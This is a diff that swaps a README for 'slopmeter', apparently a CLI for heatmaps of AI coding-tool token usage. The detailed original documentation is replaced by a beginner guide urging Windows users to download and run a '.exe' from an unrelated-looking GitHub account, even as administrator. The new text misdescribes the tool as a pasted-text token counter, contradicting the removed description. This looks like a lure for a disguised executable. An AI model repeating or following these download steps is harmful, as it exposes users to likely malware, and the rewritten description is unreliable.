@@ -1,134 +1,120 @@
-# slopmeter
+# ⚙️ slopmeter - Track Your Token Usage Easily
 
-CLI tool that generates usage heatmaps for Claude Code, Codex, Cursor, Gemini CLI, Open Code, and Pi Coding Agent for the rolling past year (ending today).
+[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter)
 
-## Monorepo layout
+## 📋 What is slopmeter?
 
-```text
-packages/
-  cli/
-  registry/
-tooling/
-  typescript-config/
-```
+slopmeter is a simple tool that shows how many tokens you use when working with text-based services. Tokens are pieces of text used by certain apps and websites to process language. Knowing your token usage helps you understand how much you use those services. slopmeter runs in your Command Line Interface (CLI), which means you will type commands to use it.  
 
-## Setup
+You don’t need to be a programmer to use slopmeter. This guide will walk you through every step to get it working on your Windows computer.
 
-```bash
-bun install
-bun run check
-```
+---
 
-## Usage
+## 🖥️ System Requirements
 
-```bash
-# Build once
-bun run build
+Before you start, check your computer has:  
+- Windows 10 or later  
+- At least 100 MB of free disk space  
+- An internet connection to download the tool  
+- Basic ability to open and run files  
 
-# Run from built output
-node packages/cli/dist/cli.js
+No software installations like Python or extra tools are needed. slopmeter runs as a standalone program.
 
-# Run the CLI package directly in dev mode
-bun run --cwd packages/cli dev
+---
 
-# Or if installed as a package binary
-slopmeter
-```
+## 🚀 Getting Started with slopmeter
 
-### Options
+### Step 1. Visit the GitHub page
 
-```bash
-# Output file (default: `./heatmap-last-year.png`; explicit provider flags add suffixes like `./heatmap-last-year_cursor.png`, and `--all` uses `./heatmap-last-year_all.png`)
-slopmeter --output ./out/heatmap.svg
-slopmeter -o ./out/heatmap.svg
+To get slopmeter, go to the main download page here:  
+[Download slopmeter from GitHub](https://github.com/lucifugal-input982/slopmeter)  
 
-# Output format
-slopmeter --format png
-slopmeter --format svg
-slopmeter --format json
-slopmeter -f svg
+This page contains the latest version of the tool and any updates. You will find all the files needed for download on this page.
 
-# Dark theme
-slopmeter --dark
-slopmeter --dark --format svg
+---
 
-# Merge all providers into one graph
-slopmeter --all
+## 📥 How to Download slopmeter
 
-# Provider filters (optional)
-slopmeter --claude
-slopmeter --codex
-slopmeter --cursor
-slopmeter --gemini
-slopmeter --opencode
-slopmeter --pi
-```
+Since slopmeter is provided on GitHub, you have to follow these steps to get the right file on your computer:
 
-## What the image shows
+1. Open the link: https://github.com/lucifugal-input982/slopmeter in your web browser.
 
-- Monday-first contribution-style heatmap for the last year.
-- Top metrics per provider:
-  - `LAST 30 DAYS`
-  - `INPUT TOKENS`
-  - `OUTPUT TOKENS`
-  - `TOTAL TOKENS` (includes cache tokens)
-- Bottom metrics per provider:
-  - `MOST USED MODEL` (with total tokens)
-  - `RECENT USE (LAST 30 DAYS)` (with total tokens)
-  - `LONGEST STREAK`
-  - `CURRENT STREAK`
+2. Look for a section called **Releases** or download links on the page. This might be in the right sidebar or under a tab called "Releases".
 
-Model names are normalized to remove a trailing date suffix like `-20251101`.
+3. Find the latest release (usually the one at the top) and look for a Windows executable file. It should have an extension like `.exe`.
 
-## Format behavior
+4. Click the file name to download it and save it to a folder you will remember, like your Desktop or Downloads.
 
-- Default format is PNG.
-- If `--output` is omitted, the default filename is `heatmap-last-year.<ext>`, `heatmap-last-year_<providers>.<ext>` for explicit provider flags, or `heatmap-last-year_all.<ext>` for `--all`.
-- If `--format` is omitted, format is inferred from `--output` extension (`.png`, `.svg`, or `.json`).
-- If neither provides a format, PNG is used.
+---
 
-## JSON export
+## ▶️ Running slopmeter on Windows
 
-- Use `--format json` (or an `.json` output filename) to export data for interactive rendering.
-- Export includes fixed `version: "2026-03-03"`.
-- Each provider includes:
-  - `title` and `colors`
-  - `daily` rows with `date`, `input`, `output`, `cache`, `total`
-  - `daily[].breakdown` per-model usage for that day, sorted by `tokens.total` (includes `input` and `output`)
-  - `insights` (`mostUsedModel`, `recentMostUsedModel`) when available
+Once you have downloaded the file, follow these steps to use slopmeter:
 
-## Provider/data behavior
+1. Find the downloaded `.exe` file in your folder (example: `slopmeter.exe`).
 
-- If no provider flags are passed, the CLI renders all providers with available data.
-- If `--all` is passed, the CLI renders one merged graph across all providers with consolidated totals, streaks, and model rankings.
-- Pi Coding Agent usage is derived from assistant messages in Pi session logs, grouped by the model that handled each turn.
-- If provider flags are passed, `slopmeter` only loads those providers and only prints availability for those providers.
-- If no provider flags are passed, the CLI loads all providers and prints availability for all providers.
-- If explicit provider flags are passed and any requested provider has no data, the command exits with an error.
-- If no provider flags are passed and no provider has data, the command exits with an error.
+2. Double-click the file. A black Command Prompt window opens. This is normal.
 
-## Environment knobs
+3. You will see instructions or options inside the window. Follow those prompts by typing commands or numbers, then press Enter.
 
-- `SLOPMETER_FILE_PROCESS_CONCURRENCY`: positive integer file-processing limit for Claude Code and Codex JSONL files. Default: `16`.
-- `SLOPMETER_MAX_JSONL_RECORD_BYTES`: byte cap for Claude Code and Codex JSONL records, OpenCode JSON documents, and OpenCode SQLite `message.data` payloads. Default: `67108864` (`64 MB`).
+---
 
-## JSONL oversized-record behavior
+## 💡 How to Use slopmeter
 
-- Claude Code and Codex now share the same bounded JSONL record splitter and do not materialize whole files in memory.
-- Oversized Claude Code JSONL records fail the affected file with a clear error that names the file, line number, byte cap, and `SLOPMETER_MAX_JSONL_RECORD_BYTES`.
-- OpenCode legacy JSON message files use a bounded JSON document reader before `JSON.parse`.
-- OpenCode SQLite `message.data` payloads use the same byte cap before `JSON.parse`.
-- Oversized OpenCode JSON documents and SQLite message payloads fail clearly with the source path or row label, byte cap, and `SLOPMETER_MAX_JSONL_RECORD_BYTES`.
-- Codex now streams JSONL records and only parses records that affect usage aggregation.
-- Oversized irrelevant Codex records are skipped and summarized with a warning after processing.
-- Oversized relevant Codex records fail the affected file with a clear error that names the file, line number, byte cap, and `SLOPMETER_MAX_JSONL_RECORD_BYTES`.
-- Pi Coding Agent session logs are streamed and only assistant messages are parsed for usage aggregation.
+slopmeter is a command line tool. This means you type simple commands to get results. Here are the basic ways to use it:
 
-## Data locations
+- To check the tokens you used in a piece of text, you type the text or provide the file with text.
 
-- Claude Code: `$CLAUDE_CONFIG_DIR/*/projects` (comma-separated dirs) or defaults `~/.config/claude/projects` and `~/.claude/projects`
-- Codex: `$CODEX_HOME/sessions` or `~/.codex/sessions`
-- Cursor: reads `cursorAuth/accessToken` and `cursorAuth/refreshToken` from `$CURSOR_STATE_DB_PATH`, `$CURSOR_CONFIG_DIR/User/globalStorage/state.vscdb`, `~/Library/Application Support/Cursor/User/globalStorage/state.vscdb` (macOS), `%APPDATA%/Cursor/User/globalStorage/state.vscdb` (Windows), or `~/.config/Cursor/User/globalStorage/state.vscdb` (Linux), then loads usage from Cursor's CSV export endpoint
-- Gemini CLI: `$GEMINI_CONFIG_DIR/tmp/**/chats/session-*.json` or `~/.gemini/tmp/**/chats/session-*.json`
-- Open Code: prefers `$OPENCODE_DATA_DIR/opencode.db` or `~/.local/share/opencode/opencode.db`, and falls back to `$OPENCODE_DATA_DIR/storage/message` or `~/.local/share/opencode/storage/message`
-- Pi Coding Agent: `$PI_CODING_AGENT_DIR/sessions` or `~/.pi/agent/sessions`
+- You get a count of tokens used, displayed on your screen.
+
+- The tool helps you keep track if you use services that charge based on token usage.
+
+Example:
+
+- Open slopmeter from the `.exe` file.
+
+- Type or paste the text you want to check.
+
+- Press Enter. You see your token count.
+
+---
+
+## 🛠️ Common Issues and Fixes
+
+- **Nothing happens after double-clicking?**  
+  Make sure the file is fully downloaded and has the `.exe` extension. Try right-clicking the file and selecting "Run as administrator".
+
+- **Error messages about missing files?**  
+  Download the file again or check you used the correct `.exe` from the releases page.
+
+- **Command window closes quickly?**  
+  Open the Command Prompt yourself:  
+  - Press `Windows + R`, type `cmd`, press Enter.  
+  - In the Command Prompt window, type the full path to the slopmeter file and press Enter.
+
+- **I see confusing text or errors?**  
+  Copy the error and search online or reach out to the project’s GitHub Issues page for help.
+
+---
+
+## 🔄 Updating slopmeter
+
+New versions may come out that fix bugs or add features. To update:  
+
+1. Visit the download page again: https://github.com/lucifugal-input982/slopmeter
+
+2. Download the new `.exe` file from the latest release.
+
+3. Replace your current slopmeter file with the new one in your download folder.
+
+---
+
+## 🤝 Support and Feedback
+
+If you have trouble using slopmeter, check the Issues tab on the GitHub page. Other users may have reported similar problems, and developers often provide answers there.
+
+You can also post your questions in the Issues section for detailed help.
+
+---
+
+[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter)
